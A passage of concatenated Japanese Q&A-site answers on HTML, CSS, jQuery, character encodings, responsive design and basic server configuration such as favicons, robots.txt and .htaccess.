というのがあるのだが、これは（２）だとcssの読み込みの後に実行され、（１）だとcssの読み込みと並行して実行される（ChromeがLINKタグにたどり着いた時には既にBODYタグが読み込み終了しているため）。ただ、これはjQueryの特性なのでこれを期待して（１）の書き方をするよりかはより正しい文法であると思われる（２）を使うのが吉だろう。また、普通使われる $(function () { // fugafuga }); は $(document).ready(function () { // herohero }); の略で、jQuery的にはこちらの方が文書を読み込んだら実行する処理の記述として本則であろうと思われるのでやはり"body".readyなどを期待してGoogleさんの書き方に倣うのは好ましいとは思えない、というのが私の感想だ。
そらは仕様です。 jsなどを駆使して組み込まない思った挙動にはならないと思います。
なんかしら計算する（高さを知る）必要があるという事ですよね？ レスポンシブでもそうでなくとも要素を追加すれば高さはどんどん変わります。 文字サイズでも変わるし、設計段階でこれをいちいち計算して…なんてのは（僕には）無理です。 計算しようとするのではなく、javascriptで要素の「高さを取得する」という考え方の方がいいのではないでしょうか。 中身が増えようが減ろうが、結果としてその要素の高さを取得できます。
まあCSSやHTMLは何も見ないですらすら出来ますけど 大概のデザインページってのは、プログラムあり気でデザイン載せてるんじゃなくて デザイン先に載せて、それに機能を付加していくのが普通なので 8割デザイン　2割機能です。 それに主流で使うものはそんなにたいした量はありませんから まさかツールを使わず手打ちでやっているのですか？ プロほどDW使いますよ。デザインページと連動が面倒になるから。 データベースでもない限りいちいち1からくみ上げるなんてことはしないで、ソースブロック貼り付けて ちょこちょこいじって数時間で仕上げるのが普通です。
そうです。 現状では、各ブラウザのレンダリングエンジンが賢いので大概はちゃんと表示してくれますが、非推奨のタグをサポートしなくなったら表示が崩れてしまいます。
XMLは汎用的なマークアップ言語の仕様・規格です。 表記方法はHTMLとよく似ています。 HTMLはXMLの一種なので似ていて当然ですね。
＞ pタグは、パラグラフの頭文字で、Pタグなのでしょうか？ 　そのとおりだと思います。<p>ひとつの段落</p>ですね。 ＞ pタグじゃなくても、改行されるタグは有りますよね？ 　<p>のほかに<div>や<h1>など、《ブロック要素》と呼ばれるタグは改行されます。反対に、<span>や<strong>などは《インライン要素》といって、基本的には改行されません。 　ブロック要素とインライン要素の違いが分かるようになってくれば、<p>タグもふくめて、どんなタグに改行が入るのかが予想できるようになります。
ブラウザ上でグラフィカルに成形される結果の事だけを考えれば<div>でも問題ありません。 html5で追加された要素やタグの意味付けは、htmlをコンピュータで解析し情報として処理する事が目的となっているモノが多く存在します。 検索エンジンがクロールして集めたhtmlを解析する場合など、機械的に文章の解析をしようとした場合、どこまでが一つの情報の塊なのか判断できないので複数の情報が1ページに掲載されているケースでは誤った単位で情報を解析してしまう可能性があります。 そういった状況に対して、情報の発信者側が明示的に一つ一つの情報の範囲を示すことが出来るようになり、発信者の意図を正しく受信者に伝えることができます。 今後、検索エンジンだけでは無くビッグデータ解析のようなインターネット上の情報を機械的に分析して活用するケースが増えていきますので、発信者の意図を正しく理解させるためにタグの意味を理解して使い分けていくことが求められます。
各ドメイン名毎にドキュメントルートを分けていないのでしょうか？ ドキュメントルートを分けられるなら、各ドメイン名毎のドキュメントルートにfavicon.icoを置けば解決。 1つのドキュメントルートで全てのドメイン名へのアクセスを受ける必要があるなら、mod_rewrite とか使って、ドメイン名ごとにfavicon.icoで呼ばれた時に返すファイルを出し分けるというのも手ですかね。
凄いhtmlですね… 外部ファイルか<head>内にcssが書けるなら、単純にこんな感じで実現出来るんじゃないでしょうか？ a:visited, a:visited span, a:visited strong{ color:blue !important; }
Google ですと、meta要素やrobots.txtで拒否してもインデックスされます、検索結果には『このサイトの...により表示されません』となります、ただしそこからのリンクでページは表示されます。 検索結果に表示されなくて、クローラーの巡回も拒否するには、.htaccess を使用してください。 すでにインデックスされているページは、ウェブマスターツールから先に削除しておくことが必要です。
spanタグですが、インライン要素となるためmarginやwidthを設定することはできません。 こちらは決めごとなのでおぼえていただくしかない感じです。 ■ブロックレベル要素とインライン要素 http://www.tagindex.com/html_tag/basic/block_inline.html
HTML5、CSS3対応は必須だと断定しておきます。 それに対応していないブラウザがあるとか、とくにinputタグでandroidに混乱が出るなどを言う人がいますが、それでも確信を持って断定します。 これは技術的な問題ではなく市場の問題です。 ひとつのサイトを、xhtmlの時代にはPCしか見なかったのが普通だったのです。 今、タブレットやスマホがPCと一緒になって参照します。 サイトによってはスマホの比率が7割を超えるところもあります。 このとき、昔の携帯サイトみたいにURLに/mとつけて別にページを付けるというようなことをしてもいいですけど、賢くない。 /mとやると、携帯からはそのスペルではいらないと表示はおかしくなりました。 だからユーザーが意識してちゃんとURLを入れる義務があった。 いまどきそんなことを言ったらスマホを抱きしめて寝ているような小学生がだまっていない。 スマホで行けばスマホのデザインになっているべきだ。 PCで入るならPCで見て一番きれいな状態になっていなければおかしい。 こういうことを「レスポンシブ設計」と言いますね。 これがCSS3で簡単に実現するわけです。 クリッカブルになっているボタンが、PCでクリックすれば問い合わせページに行ったりメールしたりするようにします。 同じボタンがスマホだと、直接電話をかけるようにもできます。 文字のサイズは読める程度になり、画像を無意味な縮小表示でイラつかせもしません。 適性なサイズのデザインで、適性な文字の大きさになっています。 横に並べて比較すると、レイアウト自体がもう違っていて、まるでそれぞれに別々にページをデザインしたように見えてしまいます。 HTML5で書いた本体の部分は全く同じなのに、と言うことです。 もしポストされたパケットを解析し、電話機の機種の判断をした上HTML表示を変えるなんていうプログラムをするのであればそこにはバグが発生します。 安定しません。仕様の変更の度にプログラムを修正しなければいけませんから全部のテストをし直す必要が出てきます。 .htaccessで切り分けて表示ということをするのであれば、結局全媒体にひとつずつが画面を用意せざるをえないことになります。 ちょっとした修正が必要なとき全媒体用に対応できたかという横展開チェックが必要で、これもミスの元です。 HTML5とCSS3なら、そもそもプログラムがありませんから、デザインミスはあり得てもバグは出ません。 仕様変更は、単純に外部設計の修正で済みます。 そういう意味がありますので、HTML5とCSS3は必須だと言うわけです。 対応していないブラウザがあるというのは、世代交代時の必然ロスです。時間が解決します。 知らないままに過ごしていけば、全部がHTML5とCSS3の時代になったときに時代遅れの技術者になっているだけです。
スタイルシートを使用することになります。 <a href="#リンク先">クリック</a> <Br><Br><Br><Br><Br><Br><Br><Br><Br><Br> <a name="リンク先" style="padding-top:1cm">リンク先</a> ですが、今では<a name... は使用しません、場所の指定はIDを使います。 また、cmという単位ではなく、pxを使うのが一般的です。 <a href="#name">クリック</a> <p style="height:200px"></p> <div id="name" style="padding-top:30px">リンク先</div>
http://www.tagindex.com/html5/page/meta_viewport.html initial-scale 1 user-scalable no 設定でいかがでしょう。
td { width: 2em;} td:first-child { width: 1em; } 最初の要素を指定する。 または td { width: 1em;} td + td { width: 2em; } 直後の要素を指定する。 などで可能です。
もしかして入力されたxxxxがhtmlファイル名？ Aさんのパスワードがaiueoだとしたらトップページはaiueo.html Bさんのパスワードがkakikukekoだとしたらトップページはkakikukeko.html って感じ？ 普通というか一般的にはhtmlとjsのみでやる内容じゃないからいろいろ小細工しないとだけど全部説明するのは難しい。 ＞divの内容を別のhtmlにして読み込む？ ＞displey表示非表示 htmlソースにAさんBさんCさんの内容を書いちゃったらソース見れば他の人のも見えちゃうし、じゃあどうしようかってなるとAjaxを使って非同期で取得することになるかなぁ。 だけどそれもどこのURLに通信行ってるか見えちゃうから、そこにアクセスされたら他の人でも見えちゃう。 別に見えてもいいっていうんだったらそれでもいいんだけどさ。 これ、どこまで厳密に考えているの？ まあ厳密に考えるならhtmlとjsのみでは無理という回答になる。
http://www.benricho.org/moji_conv/16-URLencode_UTF-8.html で「デジタル大辞泉」と入れてUTF-8でエンコードしてみてください。 %E3%83%87%E3%82%B8%E3%82%BF%E3%83%AB%E5%A4%A7%E8%BE%9E%E6%B3%89 と出てくる思います。 >これはどういう意味でしょうか？ 「デジタル大辞泉」って言葉を含んでいるのだろうと思われます。
何の目的でkeywordsを設定するのですか？ 対GoogleのSEOが目的だとしたら無意味です。Googleの公式Blogでkeywordsの中身は検索結果にヒットさせる要素として見ていないと言っています。
間違いが有りました。すいません find ./hoge -type f|while read line do echo -n $line " " echo -n `cat $line | sort | uniq -c|sort -k1nr |head -n 1|awk '{print $1}'` echo "" done
bootstrapで必要な部分だけコピーしちゃえばいけると思います。 　　 <div class="container"><!--table役//--> <div class="row"><!--tr役//--> <div class="col-xs-6">セル1</div> <div class="col-xs-6">セル2</div> </div> <div class="row"> <div class="col-xs-12">結合セル</div> </div> <div> 　 後はjavascriptでrow内のdivの高さを揃えればOK。 調整が楽なものならdivにcssでheight指定でも良いかもです。
<h2>文字</h2> がいいです。 どうしてもデザイン上2重に囲む必要があるなら <h2><span>文字</span></h2>や <div><h2>文字</h2></div> がいいでしょう。 <h2></h2>…見出し（2番目） <p></p>…段落 <div></div>…意味を持たない囲み（ブロックレベル要素） <span></span>…意味を持たない囲み（インライン要素） 見出しの中に段落があるのはおかしいので<h2><p>文字</p></h2>は誤りだと言えます。 また、そもそもh1～h6タグの中にはブロックレベル要素は入れられないので、<p></p>や<div></div>を入れると文法エラーです。
読み込み速度は表示サイズでは無くファイル容量で決まるので、同じ画像ファイルなら100％表示も10％表示も読み込み速度は一緒。
昔は、divタグはある一定の意味を持つ区画に使われました。ブロック要素です。 今では比較検討され、section, article, header, footerなどに細分化されました。そのため、HTML5ではその他のブロック要素という位置にあります。 使い方は実践でというくらい幅広い使われ方がします。
requiredは必ず動くとは限りません。以前はその機能はありませんでした。 自分でJavaScriptで書くか、互換を持たせたライブラリを探せば、互換性も上がるのでおすすめです。
abbrタグは、それが略語であり頭字語であることを示します。 http://www.htmq.com/html/abbr.shtml
Webサイトのモバイル対応は、スマホ用のサイトを作成してユーザーエージェントで振り分ける方法と レスポンシブWebデザインで作成するという2種類が主流です。 レスポンシブデザインは、「ブラウザの幅」によって適用するcssを変更するという手法で構築を行います。 メリットとデメリットはこちらを参考に。 http://www.coprosystem.co.jp/tipsblog/2013/06/28.html 「効率の良い方法」というのがどういう意味かにもよりますが、 構築の効率で言うとスマホサイト、今後の管理の効率で言うとレスポンシブに軍配が上がるかと思います。 レスポンシブは一般的にPCサイト・スマホサイトを二つ作るよりも作業量が多くなる事が多いですが、1コードで済むため更新時の効率は良いです。 ただ、レスポンシブは慣れてない場合は結構難しい上に、「既存のサイトをレスポンシブ化する」というのは無茶な場合が多いので、PCサイトごとリニューアルする事になるかと思います。 「現在のサイトをＰＣでもスマホでも見やすくする方法」というものではありません。
CSSで、line-heightを指定します。例： line-heght: 1.5; CSSについてご存じなければ、「CSS入門」「スタイルシート入門」などで検索してください。
トップページデザインで20,000～100,000円。 サブページデザインで5,000～20,000円。 コーディングで1P 5,000～10,000円。全15Pで75,000～150,000円。 テキストはキャッチ、リード、本文までお願いするとした場合、1P 5000~2万円以内。全15P 75,000～300,000円。 なので価格感としては、175,000～570,000円ぐらいではないでしょうか？ もちろん、頼む業者によっては天井はない感じです。 あとは、もしPCとスマホをまったく違う感じにしたい場合は2サイト分の料金がかかります。 目安としてご参考ください。
文字コードがUTF-8なら半角カナを使っても問題ありません。 Shift JISやJISコード、EUC-JPの場合は、半角カナが使用する文字コードがASCIIコードで特殊な機能を持つ制御文字と同じコードを使用するため、閲覧者の環境によっては意図しない表示になるので避けた方がいいという事です。 半角記号はそのまま使用しても問題ありませんが、一部はHTMLやURLで特別な意味を持つ制御文字と解釈される場合があるので、そういう場合は文字実体参照を用いるといいでしょう。
htmlでは「">」、xhtmlでは「" />」です。 意味を説明しますと、「" />」は修了タグなんです。 <div></div> で言う所の「</div>」に該当します。 htmlでは終了タグを省略してもよいタグがありました。 （</li>や</body>等） が、xhtmlでは終了タグを省略できないルールとなりました。 ですので、今まで <ul> <li>〇〇〇〇 <li>〇〇〇〇 </ul> と書いてもよかったものが、xhtmlでは <ul> <li>〇〇〇〇</li> <li>〇〇〇〇</li> </ul> と書かなくてはならなくなりました。 そこで本題ですが、<meta>,<img>,<br>,<hr>と言った、元々終了タグが存在しない独立したタグ（空要素タグ）もxhtmlでは終了タグを書こう！という事になりました。 それが「" />」です。 最後の「>」の前に半角スペースとスラッシュを入れる事で、終了タグの代わりとしました。 今主流になりつつあるhtml5はxhtmlではないので、閉じタグを省略する事が出来ます。 空要素タグに関しても「">」が正しいのですが、xhtmlへの後方互換の為に「" />」と書いても間違いではない、とされています。 html4.01のルールが出来た頃は「" />」の概念が存在しなかったので、「" />」と書くとエラーになります。 まとめ html4.01　〇「">」　×「" />」 xhtml　×「">」　〇「" />」 html5　〇「">」　△に近い〇「" />」
>html4で宣言していることになるのでしょうか？ まぁだいたいそうですね。4.01と書いてあるので、正確には4ではなく4.01ですが。 >html5は聞いたことが有りますが >html4と言うのは存在するのでしょうか？ 当然存在しますよ。4系は4.0と4.01の2つです。 >html4.1と言うのは聞いたことがあります。 そうですか？4.1は存在しませんので何かの間違いでしょう。 4.01は1999年12月勧告、5.0は2014年10月勧告なので4.01が最新バージョンだった時代は15年ということになります。古いページは4.01で書いていることが多いので、古いページのコピペをしているとそうなったりしますが、新たに書くなら5で書いたほうがいいですよ。
表はtable リストはul, ol, dl スマホだからということではなくタグの意味で使い分けましょう。 スタイルはCSSでどうとでもなります。 jQuery Mobileを使うのは主流とまではいかないでしょう。
画面いっぱいというのは、テキストが大きく表示されるということでしょうか？ それともbackgroundで色などを指定していて、その範囲が画面いっぱいでしょうか？ ちょっと状況がわかりません。
同じURLを入力しているのにPCから見るとPCサイト、スマホから見るとスマホサイトが表示されるというのはWebサーバー側で「ユーザーエージェント」というものを見て判断している。 なので、このユーザーエージェントというものをスマホであるかのように設定するとパソコン版のFirefoxでもスマホサイトを見る事ができる。そうするとパソコン版のFirefoxなのでソースを見る事もできる。Firefoxなら「User Agent Swicher」というアドインを入れると簡単にこれができるぞ。 他のブラウザでも検索すればやり方が見つかるだろう。詳しくは「ユーザーエージェント 偽装」などで検索するといいだろう。偽装と言っても偽装結婚とか偽装難民とかそういう法に触れるようなものではないので安心されたい。
data-roleという属性自体は別にデザインに関連してこないんだけど、何かプラグインみたいの使ってるの？ 使っているんだったら何らかの影響があるかもしれないけど。 jQueryMobileかな？ 試してないけど ul.test { margin-top:100px !important; } でだめ？
1番目は明らかに間違い。2番目ですかね。 タイトルは「検索結果やブックマークなど、単独ページとして提示されても、どんなページかを読者が識別できるように」付けます。(なのでタイトルにサイト名を含める場合が多い) 見出しタグ、特にH1は「そのページには何が書かれているか」。あとはご存知の通り段階的にh2～を使用します。 論文のようなアウトラインを意識するとよいかと。 もう御察しかと思いますが、例えば　日本昔ばなしのサイトだとすれば、 <title>【日本の昔ばなし】鬼退治シリーズ <h1>鬼退治の昔話 　<h2>桃太郎 　　<h3>桃から赤ちゃん! 　　<h3>元気に成長 　　<h3>鬼退治 　　　　<h4>イヌとの出会い 　　　　<h4>サル～ 　　　　<h4>キジ～ 　　　　<h4>決闘 　<h2>一寸法師　　～ のようになるでしょう。もちろん1ページ1話に切れば、見出しが繰り上がって <title>【日本の昔話】桃太郎 <h1>桃太郎 　<h2>桃から赤ちゃん ～ のようになります。 原則 同サイト内に同名タイトル,同名H1は出現しません。
仕事ですか。仕事なら規約に沿っていれば良いと思います。 それについて規約がないのであれば、他の規約と見比べてみて、適切な規約を追加して対応すべきかと思います。 規約自体がないだとか、そもそも仕事でもないのであれば、御自由にどうぞ。 個人的にはテーブルは使うべきでないと思います。
古いIEではpx指定だと拡大できないという問題がありました。 しかし現在では改善されたので、emやpxどちらでも構わないと言ってもいいでしょう。 ただしemは要素の親子関係にしたがって、効果が重複してしまうという難点があります。 http://coliss.com/articles/build-websites/operation/css/font-size-with-rem-by-snook-ca.html なのでremを使うという流れになってきているようです。 http://ideahacker.net/2014/02/12/7486/
Yes
>なぜ実際に問い合わせがこないのか、アクセス解析をしてもよくわかりません。 問い合わせというか、ちょっと疑問があって問い合わせボタンを押し、問い合わせフォームにアクセスしたけど「電話番号や自分のメールアドレスを入れてまで質問しようとまでは思わない」ってことで、そこで終わらせる人が多いのでしょう。
c++ した値をvalueに戻していないかではないでしょうか？ c++ した後に、 document.getElementById("submit").value = c; のような感じで増やした値を戻してあげる必要があるかと思います。
Pタグ=paragraph（パラグラフ）なので、段落となります。 spanは段落のなかで一部分と考えてください。 ●もし、段落全体の色やサイズを変えたい場合は、Pタグに対して色やサイズの指定をする。 ●もし、段落の一部分の色やサイズを変えたい場合は、Pタグを使ってそのなかで変えたい部分をSPANタグで囲み、SPANタグに対して色やサイズの指定をする。 といった感じになります。
未検証ですが、 HTML4なら、 <input type="submit" name="submit" value="送信" onClick="form.action='tcpdf/pdf.php';form.target='_blank';return true" class="button_order"> （target='_blank'ではなくform.target='_blank'） HTML5ならonClickを使わずに、 <input type="submit" name="submit" value="送信" formaction="tcpdf/pdf.php" formtarget="_blank" class="button_order"> でもいけそうな気がします。 http://www.htmq.com/html5/input_type_submit.shtml
cmとか、長さの単位で例えるのは、ディスプレイ上や印刷物では、解像度によっていくらでも変化するので好ましくありません。画像のピクセルサイズで表しましょう。 さて、ご質問の内容ですが、imgタグだけでは出来ません。 例えば400 x 300の画像で、左から200pxまでの部分（座標0,0～199,299）の範囲を表示したいなら、 <style> div#imgContainer { position:relative; overflow:hidden; width:200px; height:300px; border:1px solid blue; padding:0px; } div#imgContainer img{ position:relative; left:0px; top:0px; width:400px; height:300px; border:0px; padding:0px; margin:0px; } </style> <div id="imgContainer"> <img src="xxx.jpg"> </div> と言うように、レイアウトコンテナ（div）の中にイメージ（width:400px height:300px）を表示して、レイアウトコンテナのサイズを実際に表示するサイズ（width:200px height:300px）に合わせ、はみ出した部分を非表示（overflow:hidden）にする事で実現します。 この際、レイアウトコンテナとイメージの間には、それぞれのpaddingとイメージのmargin、枠線（boder）が存在するので、レイアウトに合わせそれぞれ調整します。
google ロボットに認識してもらうためには、 <meta name="description" content="" /> <meta name="keywords" content="" /> 記述されてますよね！・・・ HTML4.01の記述の場合は、<div id="header">と、書かれていれば、</div>までの、間が、headerだと、 ブラウザは、判断しレンダリングします。 HTML5だと、<header></header>の部分
aspxはマイクロソフトのActive Server Pagesという環境を使った一種のCGIです。 .php とか .pl 、 .cgi などと基本的には一緒で、サーバサイドでプログラムを実行し、その結果をHTMLとして出力します。 20行程度しかソースが無いのはJavaScriptを使って動的にページ内を書き換えるようにしているからでしょう。
<table> <tr> <td rowspan="2">左</td> <td>中上段</td> <td rowspan="2">右</td> </tr> <tr> <td>中下段</td> </tr> </table> じゃ、なかったかな？
<abbr title="Cascading Style Sheets">css</abbr>は、W3Cの勧告で、文章構造とデザイン・装飾の分離 という考え方から生まれました。経緯についっては、Wikiなどをご覧になれば詳しく説明されています。 出力デバイスに対する、設定ファイルの集まりのようなものです。 あらゆるデバイスに対し、テキストファイルで、簡単に設定できます。
そのリンクをはれば一発なのでは
レイアウトのサンプル。 #wrap { overflow: hidden; } #box-middle1, #right-box { width: 50%; float: left; } <div id="wrap"> <div id="box-middle1" style="background-color:orange"> box-middle1 </div> <div id="right-box"> <div id="box-middle2" style="background-color:pink"> box-middle2 </div> <div id="box-middle3" style="background-color:green"> box-middle3 </div> </div> </div>
ブラウザに閉じた話であれば、半角片仮名は、「見た目が汚い」という主観的な短所を除けば技術的な問題はないです。 メールについては、日本語メールで主として使われているISO-2022-JPという文字エンコーディングでは、半角片仮名は定義されていません。 （細かいことを言うと、ウェブサイトでも、UTF-8とかeuc-jpなどでなく、ISO-2022-JPのエンコーディングを使った場合は半角片仮名は使えませんが、そういうケースは事実上ないでしょう） なので、ブラウザからメールソフトにコピペされるおそれが全くないのであれば、ウェブでは半角片仮名を使っても何の問題もありません。メールソフトにコピペされるおそれが少しでもある場合は、それとわかるように注意書きを付けた方が良いでしょうね。
ピンボケで最後の部分がよく見えませんが、index.htmlの、12,29,493行目の記述にミスがあるということです。 SRC=""の部分に記述されているimageの名前と位置が間違っているのでは？・・・ ソースがないのでこれ以上のことは、わかりません！ 行の前後に、間違いがあるのかもしれませんが？・・・ 実際に見てみなければわかりません！
削除された要素と属性は、下記の通りです。 http://www.html5.jp/trans/w3c_differences.html#absent-elements http://www.html5.jp/trans/w3c_differences.html#changed-attributes
ページリンクのURLにパラメーターをつける http://forum.samuraiz.co.jp/samu06/01.html とか参照してみては？「sc_lid=RS_todetail_shopname」の詳細までは分かりません。恐らくぐるなびのサーバ上で動いているプログラムにそのデータを渡しているだろうと思います。
想像での回答になり、間違っていましたら大変恐縮ではございますが・・・ 固定バーということは おそらくposition: fixed;で実装しているという前提で 申し上げますと、 z-indexの指定もれかpositionが影響しているのではないでしょうか。 例えば <div class="header"> ～～ </div> <div class="box"> <img src="**.jpg"> </div> というhtmlで headerに対してposition: fixed;を指定している 場合、 もしboxまたはimgに対してposition: relative;が指定されている場合は headerよりboxがレイヤーが上にきてしまいます。 boxに対してposition: relative;を使用しないようにするか、 headerに対してz-index: 10; boxに対してz-index: 0; としたらいかがでしょうか。 見当違いであればすみません。 参考になれば幸いです。
HTMLやCSSの書き方次第で、画面解像度や表示ウィンドウの大きさが変わると意図したモノと違う表示になる場合がありますね。（ディスプレイのインチ数は関係ありません） ブラウザをフルスクリーンで表示している場合と、画面の半分くらいの大きさのウィンドウで表示した場合で、見え方がどう変わるか確認して見るといいと思います。
>すいません、カテゴリが違うかと思いまして。。 それなら、どちらか一方を削除するか締め切ればいいのではないかと。 もちろん、もう１つの質問をする前にですけどね。 放置している理由にはならないですよ。 今からでも遅くないので、こちらの質問を削除するなり締め切るなどされてはいかがでしょうか。 今は私以外に回答もありませんし、私なら削除でもなんでも構いません。
画像それぞれの、特徴を知った上で使い分ける必要があります。 Pngとjpgの大きな違いは、pngまたは、gifは、透過型 jpgは、サイズは小さくできるが、透過できない！ よって、拡張子は限定できない！ 特にバックグランドに、背景色がある場合、jpgを使うと、問題が多く発生するでしょう。
1の方の回答は間違ってますね。 バージョン9"以下"のIEのみに対する指定です。 <!--[if lte IE 9]>　IE9以下 <!--[if lt IE 9]>　IE9未満 <!--[if gte IE 9]>　IE9以上 <!--[if gt IE 9]>　IE9より上のバージョン(IE9は含まない) <!--[if IE 9]>　IE9 <!--[if IE]>　IE <!--[if !IE]>　IE以外 http://dakkie.com/blog/css/ie-conditional-comments/
metaで検索したら、下記のような記事を見つけました。 得体の知れないBGMも流れていますが。 http://www.geocities.co.jp/HeartLand-Cosmos/6327/main_html3.html 参考になれば幸いです。
原因は該当ページのHTML（HEAD内）で文字コードの指定がされてないからかと。 ▼文字コード宣言は行いましょう(HTML) http://www.mozilla.gr.jp/standards/webtips0022.html PC版chromeでは上記の場合の表示させる文字コードを自動的に検出している（設定の）ために文字化けされずに表示されています。 iPhoneにおいても設定にてエンコードの自動検出をONにすれば表示されるようになると思いますよ。 ▼iPhone/iPadのChromeで文字化けするのを直す方法 http://everydaystudy.net/iphoneipad%E3%81%AEchrome%E3%81%A7%E6%96%87%E5%AD%97%E5%8C%96%E3%81%91%E3%81%99%E3%82%8B%E3%81%AE%E3%82%92%E7%9B%B4%E3%81%99%E6%96%B9%E6%B3%95/ ▼iOS版Chromeで文字化けするサイトに遭遇した時の対処法 http://www.gadget-journal.com/2012/11/ioschrome.html
一般的には、同じ結果となります。 ただし、前者は、http://○○/と書くのが正しい記述です。 ブラウザが、判断して正しく表示しています。 一般的には、index.htm,index.html,index.php などが、トップページとなりますが index.htmlを、トップページにしたくない場合は、.httpaccessファイルにトップページ名を記述してアップすれば、そのページが最初に表示されます。
img{ background-image:url(http://orange.jpg); } ???・・・画像に、背景が、必要のかな？・・・ それ以外では、このような記述は、ありえません！ 枠線を引くのであれば、 img{padding:10px; border:solid 1px #000;} と、いうような、記述になると思います。 srcというのは、ご存じでしょうが、source reference ということで、ソースが、どこに記載されているかを、表しています。当然ですが、css内には書きません！ HTML内の、alt は、画像が、表示されない場合・あるいは存在しない場合に、代替えのテキストを表示するものです。<img src="images/****.png" width="画像の幅" height="画像の高さ" alt="画像の代替え文字" /> 背景として利用したいのであれば、background-imageは、header;nav;content;fotter;blockquote;box; などに記述することに、なります。
質問の意味が、いまいち理解できないのですが？・・・ 目次を作るだけであれば、HTML内に、<li>で、記述するだけです。 <section id="mokuji"> <h2>◇ 目次</h2> <p>○○の目次</p> <ul> <li><a href="#" title="">目次1 &lt;&lt;</a></li> <li><a href="#" title="">目次2 &lt;&lt;</a></li> <li><a href="#" title="">目次3 &lt;&lt;</a></li> <li><a href="#" title="">目次4 &lt;&lt;</a></li> <li><a href="#" title="">目次5 &lt;&lt;</a></li> </ul> </section> 横並びにしたいのであれば、cssに下記を記述 ul{text-align:center;} ul li{padding-right:10px; list-mark:none; display:inline;}
希望と同じ動作となるサイトがあるでしょうから、そのサイトを参考にすると良いです。 HTMLはソースがそのまま公開されているから見られるので、参考にしたら良いです。
ご質問者様の推測どおり、カタカナを使っているためエラーがでています。 エラーメッセージは「名前文字列(ID)は半角英数字でなければなりません」であるべきでしょうね。誤解されても仕方がないと思います。すべて半角英数字に修正すると、エラーが解消されると思います。
HTMLのバージョン（文法）にも複数種類あるので、どのHTMLバージョンを使うか決めて、それにあったDOCTYPE宣言をします。 お書きのものは、HTML4のstrict(厳格な)というバージョンです。 「どのバージョンを使えば良いのか？」という意図の質問なら、これから全く新規でサイトを作るならHTML5じゃないでしょうか。 <!DOCTYPE html> 何らかのHTML自動生成ツールを使って作成するのなら、そのツールが生成するHTMLバージョンに合わせてください。
すべての要素に対して適用されますが、局所的なスタイル指定があればそちらの方が優先されます。 二重に指定があれば、よりタグに近い、より後から読み込まれたスタイルが優先されます。 それから!importantを付けると最優先されます。
No.2回答者様が書いているように、PHPが実行できる環境かを調べる必要があります。 たとえば、下記コードのみをテキストファイルに記述して、test.phpなどファイル名をつけてアクセスしてみてくだっさい。 <?php phpinfo(); ?> もしPHPが実行できる環境だと、環境情報が表示されます。 ●(参考) PHPプログラミング初心者入門講座 http://php5.seesaa.net/category/1633936-1.html 上記のような表示がされない場合は、PHPが実行できる環境ではないのでPHPのインストールなどからはじめることになります。
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no" /> は、記述されていますか？・・・
あなたはファイルをShift_JISで保存しています。それを、UTF-8だと嘘をついて開こうとしているからブラウザが正しく処理できないのです。念のため書いておきますがファイル内に「<meta charset="UTF-8">」と書くことと、ファイルをUTF-8で保存することとは違うことです。 解決方法としては 「<meta charset="UTF-8">」を書かなければ、正しくShift_JISが選択されるでしょう。無指定が不安なら「<meta charset="Shift_JIS">」と正しく指定しましょう。 どうしてもUTF-8で処理したいのなら、ファイルを保存する際の文字コードをUTF-8にしましょう。使用しているエディタでファイル保存のオプションで変更できます。簡単に出来ることですが、ファイルの文字コードを変更する方法が分からないのなら変更はあきらめ、Shift_JISで処理をさせる上記の2つのどちらかの方法をとればいいと思います。
index.htmlを省略したURLで 最後にスラッシュ「/」 を付け忘れているのでは？ http://example.com/~abc →スラッシュ付け忘れ http://example.com/~abc/ →OK
指定がない場合に何を使うかはブラウザによります。 大概のブラウザではデフォルトのフォントを選択できます。 IEでは インターネットオプション→全般→フォント で。 Chromeでは 設定→詳細設定を表示→Webコンテンツ→フォントをカスタマイズ で。
言語はブラウザにユーザーが設定するもの(あるいはブラウザのデフォルトをそのまま使うもの）なので、ユーザー（またはブラウザ作成者）の好き好きです。 jaは日本語、ja-jpは日本国(jp)で話されている日本語(ja)なので、実質的には同じです。 enと、en-us、en-gb、en-auとかだと表示される物をかえているケースもあるかもしれませんが。
"text/javascript" /> /> これがダメ。 空要素タグとはタグでくくるものが無いタグと考えればよろし。 <meta ・・・・></meta> ってタグじゃないでしょ？
HTML5なら大丈夫ですよ。下記、よろしければご参考ください。 http://liginc.co.jp/web/seo/127545
先に回答されている、sanzeroさん、lefty17さんと同様に、 私もタイトルにタグをつけるのであればh1やh2を使います。 http://www.atmarkit.co.jp/fwcr/design/tag/structure/ こちらのサイトにありますが、 文章構造を意識してタグを使い分けるといいかなと思います。
>ソース内に <LINK REV="MADE" HREF="mailto:～"> をいれようと思うのですが、 「～」の部分に、自分のメールアドレスを入れれば良いのでしょうか？ そうです。 >「<LINK REV="MADE" HREF="mailto:」の部分は、 まるまる<HEAD>～</HEAD> 内にコピペすればいいのでしょうか？ LINKタグをまるごとです。 >あと、「～」の部分に、自分のメールアドレスを入れることによって、 スパムメールが来ることもありますか？ オープンサイトであるならば、誰でもメアドが見れることになるので、 多少は覚悟しましょう。
こんにちわ。 ジオシティーズ(無料版)では、ホームページを表示すると上方に広告が表示されると思います。 その広告用のHTMLをジオシティーズ側で挿入していますよ(開始位置)という、意味を示しているのではないでしょうか。
昔は、<br>はすごくお世話になったタグでしたが、最近は嫌われていますよね(笑) 僕もすぐに使いたくなるタグです。 <BR>タグはスペースを稼ぐものではないと言う事ですが、<br />の連打はHTMLでは文法違反になると言う事らしいですが、それでスパム判定を受けることはないですし、<br />の連打のサイトでも検索上位にいるサイトも多くあります。 検索順位の一番大切なのは、正しい文法ではなくコンテンツの内容の言うことも事実です。 ただ、好かれるSEOの観点から言えば、<br>を使わないようにする事です。 仕事の案件の場合なら、絶対に使えませんが、個人の範囲なら全然OKだと思います。 ですが、<BR>の癖を直さないと・・・自分のスキルも上がらなくなりますし、 そういう意味では、CSSによりに改善をされるのがベストだと思います。 あまり使わないほうが良いのは事実ですが、使ってペナルティーを食らうわけでもないですが、検索の上位に上がる要因としても使わなくなる方が良いですし、スキルアップにもなります。
FireFoxとIEで試してみたけど隙間できますよ。 あげてもらった以外の部分が間違っているんじゃないでしょうか。 下記だけのhtmlファイルを作って試してみてください。 分かりやすいように背景が水色になるようにしています。 <html> <head> <style type="text/css"> td.mid_table{ padding:50px 50px; background:cyan; } </style> </head> <body> <table summary="mid_table"> <tr><td class="mid_table"> <h3>test</h3> </td></tr> </table> </body> </html>
